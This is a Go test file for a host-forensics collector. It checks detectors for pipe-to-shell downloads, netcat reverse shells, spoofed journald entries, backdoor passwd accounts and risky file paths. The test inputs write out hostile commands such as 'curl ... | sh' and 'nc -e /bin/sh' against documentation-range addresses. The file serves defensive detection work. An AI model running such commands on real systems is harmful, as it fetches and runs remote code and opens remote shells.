package collector

import (
	"net/netip"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Regression tests for bugs found in the full-source review.

func TestLinuxConnFindingBracketsIPv6(t *testing.T) {
	c := connView{State: "ESTABLISHED", Remote: netip.MustParseAddr("2001:db8::9"), RemotePort: 4444,
		PID: 7, Process: "bash", ImagePath: "/usr/bin/bash"}
	fs := linuxConnFindings(c)
	if len(fs) == 0 || !strings.Contains(fs[0].Detail, "[2001:db8::9]:4444") {
		t.Fatalf("IPv6 peer must be bracketed: %+v", fs)
	}
}

func TestUnitExecStartContinuation(t *testing.T) {
	unit := "[Service]\nExecStart=/bin/true \\\n  ; curl http://203.0.113.9/x | sh\n"
	got := parseUnitExecStarts([]byte(unit))
	if len(got) != 1 || !strings.Contains(got[0], "curl http://203.0.113.9/x | sh") {
		t.Fatalf("continuation line not joined: %q", got)
	}
}

func TestEnvAssignmentsAreNotPrograms(t *testing.T) {
	if got := firstProgram("LD_PRELOAD=/opt/x.so /tmp/.x/run --q"); got != "/tmp/.x/run" {
		t.Fatalf("firstProgram = %q", got)
	}
	if !pipesToShell("curl -s http://203.0.113.9/a | FOO=/a bash") {
		t.Fatal("a shell after an assignment is still the pipe target")
	}
}

func TestPipesToShellIgnoresLogicalOr(t *testing.T) {
	for cmd, want := range map[string]bool{
		"make || bash fix.sh":             false,
		"curl -s x | sh || true":          true,
		"curl -s x |& sh":                 true,
		"test -f a || sh -c 'echo hi'":    false,
		"wget -qO- x | sudo -E bash -s -": true,
	} {
		if got := pipesToShell(cmd); got != want {
			t.Errorf("pipesToShell(%q) = %v, want %v", cmd, got, want)
		}
	}
}

func TestNetcatExecFlagClusters(t *testing.T) {
	for cmd, want := range map[string]bool{
		"nc -nve /bin/sh 203.0.113.9 4444": true,
		"nc -e/bin/sh 203.0.113.9 4444":    true,
		"ncat --sh-exec sh 203.0.113.9 1":  true,
		"nc -lvnp 4444":                    false,
		"nc -q1 203.0.113.9 80":            false,
	} {
		if got := netcatExec(cmd); got != want {
			t.Errorf("netcatExec(%q) = %v, want %v", cmd, got, want)
		}
	}
}

func TestEffectivePasswordStateHonoursPasswdColumn(t *testing.T) {
	users := parsePasswd([]byte("root:x:0:0::/root:/bin/bash\nevil::1001:1001::/home/evil:/bin/bash\n" +
		"bd:$1$salt$hash:0:0::/root:/bin/sh\nsvc:*:999:999::/:/usr/sbin/nologin\n"))
	shadow := map[string]string{"root": "$6$x$y"}
	want := map[string]string{"root": pwUsable, "evil": pwEmpty, "bd": pwUsable, "svc": pwLocked}
	for _, u := range users {
		if got := effectivePasswordState(u, shadow); got != want[u.Name] {
			t.Errorf("%s: %q, want %q", u.Name, got, want[u.Name])
		}
	}
	// Without /etc/shadow only "x" accounts are unknown.
	if got := effectivePasswordState(users[0], nil); got != "" {
		t.Errorf("root without shadow: %q", got)
	}
	if got := effectivePasswordState(users[1], nil); got != pwEmpty {
		t.Errorf("evil without shadow: %q", got)
	}
}

func TestReadRegularBoundsAndRefusals(t *testing.T) {
	dir := t.TempDir()
	big := filepath.Join(dir, "big")
	if err := os.WriteFile(big, []byte(strings.Repeat("a", 100)), 0o600); err != nil {
		t.Fatal(err)
	}
	b, trunc, err := readRegular(big, 10)
	if err != nil || !trunc || len(b) != 10 {
		t.Fatalf("bounded read: %d bytes, truncated=%v, err=%v", len(b), trunc, err)
	}
	if _, _, err := readRegular(dir, 10); err != errNotRegular {
		t.Fatalf("directory: %v", err)
	}
	if r := hashFile(t.Context(), dir, 0); r.Err != errNotRegular.Error() {
		t.Fatalf("hashing a directory: %+v", r)
	}
}

func TestSSHPeerIsTheLastFromClause(t *testing.T) {
	for msg, want := range map[string][2]string{
		"Invalid user a from 9.9.9.9 port 1 from 198.51.100.7 port 5555":                        {"a from 9.9.9.9 port 1", "198.51.100.7"},
		"Failed password for invalid user x from 9.9.9.9 port 1 from 198.51.100.7 port 22 ssh2": {"x from 9.9.9.9 port 1", "198.51.100.7"},
		"Failed password for root from 198.51.100.7 port 22 ssh2":                               {"root", "198.51.100.7"},
		"Accepted publickey for ops from 198.51.100.8 port 50000 ssh2: ED25519 SHA256:abc":      {"ops", "198.51.100.8"},
		"Invalid user admin from 198.51.100.9":                                                  {"admin", "198.51.100.9"},
	} {
		ev, ok := parseSSH(msg)
		if !ok || ev.User != want[0] || ev.Addr != want[1] {
			t.Errorf("parseSSH(%q) = %+v, %v", msg, ev, ok)
		}
	}
}

func TestJournalSpoofedIdentifier(t *testing.T) {
	res := NewResult("journald")
	tr := &journalTriage{res: res, sources: map[string]*sshSource{}, byKind: map[string]int{}}
	// `logger -t sudo` from an ordinary user: journald records the real sender.
	tr.add(jlog{Ident: "sudo", Comm: "logger", UID: "1000", Transport: "syslog",
		Message: "alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/bash -c 'curl http://203.0.113.9/x | sh'"})
	// The kernel transport can't be faked by naming it.
	tr.add(jlog{Ident: "kernel", Comm: "logger", UID: "1000", Transport: "syslog",
		Message: "evil: module verification failed: signature and/or required key missing - tainting kernel"})
	tr.finish()
	out := res.Finish()
	by := recordsBy(out)
	if len(by["sudo"]) != 0 || len(by["kernel"]) != 0 || len(by["spoofed"]) != 2 {
		t.Fatalf("spoofed messages must not be parsed as their claimed source: %+v", by)
	}
	if f := by["spoofed"][0].Findings; len(f) != 1 || f[0].Rule != "defense.log_spoofing" {
		t.Fatalf("spoof finding: %+v", f)
	}
	if !journalSourceTrusted("sshd", jlog{Comm: "sshd-session", UID: "0"}) || !journalSourceTrusted("sudo", jlog{}) {
		t.Fatal("real or unverifiable sources must stay trusted")
	}
}

func TestLZ4LongLengthRunIsRejected(t *testing.T) {
	src := append([]byte{0xF0}, []byte(strings.Repeat("\xff", 4096))...)
	if _, err := lz4Block(src, 64); err == nil {
		t.Fatal("a length run past the output size must fail")
	}
}

func TestUnixPathRiskCleansAndMemfdAnchors(t *testing.T) {
	for _, p := range []string{"//tmp/x", "/usr/../tmp/x", "/./dev/shm/x"} {
		if lvl, _ := unixPathRisk(p); lvl != riskHigh {
			t.Errorf("unixPathRisk(%q) = %v, want high", p, lvl)
		}
	}
	if lvl, _ := unixPathRisk("/tmp/../usr/bin/env"); lvl == riskHigh {
		t.Error("/tmp/../usr/bin/env is /usr/bin/env")
	}
	if isMemfdPath("/home/a/memfd:notes.txt") || !isMemfdPath("/memfd:x (deleted)") {
		t.Error("memfd detection must anchor at the start of the path")
	}
}
